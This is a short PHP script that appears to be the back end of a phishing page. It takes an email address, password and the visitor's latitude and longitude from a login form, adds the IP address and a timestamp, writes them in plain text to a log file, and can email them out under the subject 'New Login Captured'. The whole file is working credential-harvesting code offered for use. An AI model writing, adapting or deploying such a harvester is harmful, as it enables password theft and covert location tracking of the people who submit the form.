<?php
// Get POST data
$email = $_POST['email'] ?? 'Unknown';
$password = $_POST['password'] ?? 'Unknown';
$latitude = $_POST['latitude'] ?? 'Not Provided';
$longitude = $_POST['longitude'] ?? 'Not Provided';

// Get user IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get current timestamp
$timestamp = date("Y-m-d H:i:s");

// Prepare log entry
$log = "Email: $email | Password: $password | IP: $ip | Latitude: $latitude | Longitude: $longitude | Time: $timestamp\n";

// Save to log file
file_put_contents("log.txt", $log, FILE_APPEND | LOCK_EX);

// OPTIONAL: Send email notification (if needed)
$to = $email; // Or your email address instead of $email
$subject = "New Login Captured";
$message = "Details:\n$log";
$headers = "From: notifier@yourdomain.com";

@mail($to, $subject, $message, $headers);

// Return a simple success response
http_response_code(200);
echo "OK";
?>
